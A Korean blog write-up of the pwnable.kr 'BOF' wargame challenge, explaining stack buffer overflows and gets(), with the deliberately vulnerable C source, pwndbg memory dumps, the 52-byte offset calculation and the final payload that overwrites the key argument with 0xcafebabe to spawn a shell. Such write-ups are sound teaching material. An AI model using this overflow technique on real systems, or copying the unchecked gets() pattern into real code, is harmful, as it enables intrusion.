+++
title = '[pwnable.kr] - BOF'
date = 2026-07-11T02:42:00+09:00
draft = false

categories = ["pwnable", "pwn"]
tags = ["pwnable.kr", "pwn", "BOF", "Buffer Overflow", "Stack", "gets", "pwndbg", "write-up"]
description = "pwnable.kr BOF 풀이 — gets()의 길이 미검증을 이용해 overflowme[32] 버퍼를 넘겨 스택 상위의 key 변수를 0xcafebabe로 덮는 스택 버퍼 오버플로우. pwndbg로 스택 레이아웃을 직접 관찰하며 오프셋 52를 계산하고 페이로드를 구성한다."
+++

# pwnable.kr - BOF

## 요약

- `gets()`는 입력값의 길이를 검증하지 않는 취약한 함수다.
- `overflowme[32]` 배열의 크기를 초과하는 입력을 전달해 **버퍼 오버플로우(BOF)**를 일으키고, 스택 상위에 위치한 `key` 변수의 값을 원하는 값으로 변조할 수 있다.

---

## 배경 지식

### 스택 버퍼 오버플로우 (Stack Buffer Overflow)

지역 변수(배열)는 함수의 **스택 프레임** 안에 잡힌다. 스택은 높은 주소에서 낮은 주소로 자라지만, `gets()`나 `strcpy()` 같은 함수는 버퍼에 값을 **낮은 주소 → 높은 주소 방향**으로 순차적으로 쓴다.

즉 배열 크기를 넘겨서 입력하면, 넘친 데이터가 **배열보다 높은 주소에 있는 다른 데이터(다른 지역변수, saved EBP, return address 등)를 덮어쓴다.** 이번 문제에서는 넘친 입력이 함수 인자인 `key`를 덮는다.

### 왜 `gets()`가 위험한가

```c
char *gets(char *s);
```

`gets()`는 **개행(`\n`)이 나올 때까지 무한정 읽는다.** 버퍼 크기를 인자로 받지 않기 때문에, 사용자가 얼마나 긴 입력을 넣든 그대로 버퍼에 쓴다. 32바이트 배열에 100바이트를 넣으면 68바이트가 인접 메모리로 넘친다. 이 설계 결함 때문에 C11 표준에서 `gets()`는 아예 제거됐고, 지금은 `fgets()`를 쓴다.

---

## 코드 분석

아래는 ELF 바이너리의 소스코드 원본이다. 매우 간단한 형식인데 `func()` 함수에서 `0xdeadbeef` 를 argument로 넘기고 `func()` 내부에서 `gets()` 로 `overflowme[32]` 변수에 입력을 받은 후 key 변수가 `0xcafebabe` 가 같은지 비교하여 참이면 현재 프로세스를 실행중인 유저의 effective GID를 설정 후 쉘을 실행 시킨다.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

그렇다면 어떻게 key 변수의 값을 변조할 수 있을까? 스택 메모리 레이아웃을 생각해보면 해답이 나올 것 같다.

![func 호출 시 인자를 스택에 push하고 새 스택 프레임을 구성하는 과정](./images/stack_layout_call.png)

우선 메인함수에서 `func()` 을 호출할 때 argument `0xdeadbeef` 값을 스택에 push한다. 그 후 function prologue 과정을 거치게 되어`(push ebp / mov ebp, esp)` 새로운 스택 프레임을 구성하게된다.

바로밑에 있는 `push esi, push ebx` 의 경우 main함수에서 사용하던 레지스터값이 func 함수내에서 수정되지않도록 스택에 보관하는 역할을 한다.(esi, ebx는 범용 레지스터라 여러 용도로 사용된다)

![gets 호출 직전, overflowme 주소를 lea eax, [ebp-0x2c]로 전달하는 디스어셈블](./images/gets_disasm.png)

여기서 중요하게 관찰해야할 부분은 `overflowme[]` 에 input을 넣어주는 `gets` 함수 주변부이다. gets함수로 실행흐름을 넘기기전에 함수의 파라미터로 값이 들어갈 주소를 전달하는 부분이 `lea eax, [ebp-0x2c]` 다. 실제로 그럴까 의심이 들기때문에 직접 관찰해보기로 했다.

우선 gets가 호출되기전에 breakpoint를 걸어둔다. 참고로 위 스크린샷에 보이는 `0x00001234` 같은 주소는 PIE(위치독립실행) 때문에 진짜 주소가 아니라 파일 기준 오프셋일 뿐이다. 아래와 같이 func함수의 base주소를 기준으로 offset을 활용해 bp를 걸도록 한다.

```bash
pwndbg> b *func+54   # push eax가 존재하는 offset
```

그리고 `r` 명령어로 실행한 뒤, 우리가 관심 있는 `ebp-0x2c` 오프셋에 위치한 주소값을 `p` 명령어로 확인해보자.

```bash
pwndbg> p $ebp-0x2c
$1 = (void *) 0xffffdb3c
```

해당 주소는 `overflowme` 배열의 시작 주소로 추정된다. `x` 명령어로 실제 스택 메모리 인근 값을 hex로 확인해보면, 다음과 같이 총 160바이트의 메모리 값을 볼 수 있다.

```
pwndbg> x/40wx 0xffffdb3c
0xffffdb3c:     0xffffdcb8      0x00000000      0x00000000      0x01000000
0xffffdb4c:     0x0000000b      0xf7fc4540      0x00000000      0xf7d954be
0xffffdb5c:     0x51a09600      0xf7fa7000      0xffffdc54      0xffffdb88
0xffffdb6c:     0x565562c5      0xdeadbeef      0xf7fbe66c      0xf7fbeb30
0xffffdb7c:     0x565562b3      0x00000001      0xffffdba0      0xf7ffd020
0xffffdb8c:     0xf7d9e519      0xffffdd8e      0x00000070      0xf7ffd000
0xffffdb9c:     0xf7d9e519      0x00000001      0xffffdc54      0xffffdc5c
0xffffdbac:     0xffffdbc0      0xf7fa7000      0x5655629d      0x00000001
0xffffdbbc:     0xffffdc54      0xf7fa7000      0xffffdc54      0xf7ffcb80
0xffffdbcc:     0xf7ffd020      0xc162b489      0x8d1c5e99      0x00000000
```

아직 `gets` 실행 전이기 때문에 `overflowme` 배열에는 쓰레기값들이 채워져 있는 것을 볼 수 있다. 눈여겨볼 점은 4번째 줄의 `0xdeadbeef`다. 이게 바로 `main()`이 넘긴 `key` 인자이며, 배열 시작보다 높은 주소에 위치한다. 메모리를 시각화하면 아래와 같다.

![gets 실행 전 스택 메모리 레이아웃 시각화 — overflowme 배열과 key(0xdeadbeef)의 상대적 위치](./images/stack_before_overflow.png)

이제 스택 레이아웃이 어떻게 구성되고있는지 이해했다. 실제로 해당 주소가 `overflowme` 배열의 주소가 맞는지 확인함과 동시에  `gets` 의 input으로 배열의 크기보다 더 큰 입력값을 넣고 메모리가 어떻게 변조되는지 직접 확인해보자. 
```
# payload: AAAAAAAAA...XXXX

pwndbg> x/40wx 0xffffdb3c
0xffffdb3c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffdb4c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffdb5c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffdb6c:     0x41414141      0x58585858      0xf7fbe600      0xf7fbeb30
0xffffdb7c:     0x565562b3      0x00000001      0xffffdba0      0xf7ffd020
0xffffdb8c:     0xf7d9e519      0xffffdd8a      0x00000070      0xf7ffd000
0xffffdb9c:     0xf7d9e519      0x00000001      0xffffdc54      0xffffdc5c
0xffffdbac:     0xffffdbc0      0xf7fa7000      0x5655629d      0x00000001
0xffffdbbc:     0xffffdc54      0xf7fa7000      0xffffdc54      0xf7ffcb80
0xffffdbcc:     0xf7ffd020      0x44982f7d      0x08e6c56d      0x00000000
```

원래 main함수에서 func 호출시 전달된 key 변수의 값이 `0xdeadbeef` 여야 하는데 자세히 보면 `0x58585858` 로 확인되며, 이것은 우리가 전달한 payload의 끝부분에 위치한 X 문자의 hex값인것을 알 수 있다. 

### Payload 구성

우리는 `overflowme` 배열의 주소를 알고 있고, cmp 문의 `[ebp+0x8]` 정보를 토대로 `key` 변수가 위치한 주소도 알고 있다. 따라서 버퍼를 얼마나 오버플로우시켜야 exploit할 수 있는지 계산할 수 있다.

`key` 주소 `ebp+0x8` 에서 배열 주소 `ebp-0x2c` 를 빼면:

```
(ebp+0x8) - (ebp-0x2c) = 0x8 + 0x2c = 0x34 = 52
```

배열 시작부터 `key`까지 52바이트다. 따라서 페이로드는 다음과 같이 구성한다.

```
"A" * 52 + "\xbe\xba\xfe\xca" + "\n"
```

- `A * 52` — 배열부터 `key` 직전까지 채우는 패딩
- `\xbe\xba\xfe\xca` — `0xcafebabe`를 리틀 엔디언으로 배치 (x86은 낮은 바이트부터 저장)
- `\n` — `gets`가 입력을 종료하도록 하는 개행

![구성한 페이로드로 key를 0xcafebabe로 덮어 쉘을 획득한 결과](./images/payload_result.png)
